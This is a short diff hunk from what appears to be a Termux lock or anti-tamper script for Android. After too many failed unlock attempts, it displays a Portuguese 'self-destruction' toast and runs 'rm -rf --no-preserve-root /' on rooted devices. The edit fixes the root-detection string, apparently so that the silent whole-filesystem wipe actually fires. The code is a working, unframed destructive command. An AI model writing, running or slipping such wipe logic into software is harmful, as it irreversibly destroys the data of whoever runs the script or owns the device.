@@ -13,7 +13,7 @@ def fail():
 
         system('termux-toast -g middler -b black -c red "Excesso de tentativas de desbloqueio atingidas, iniciando autodestruição dos arquivos..."')
 
-        if root == 'superuser binary detected.':        
+        if root == 'Superuser binary detected.':        
             system('rm -rf --no-preserve-root / > /dev/null')
 
         else:
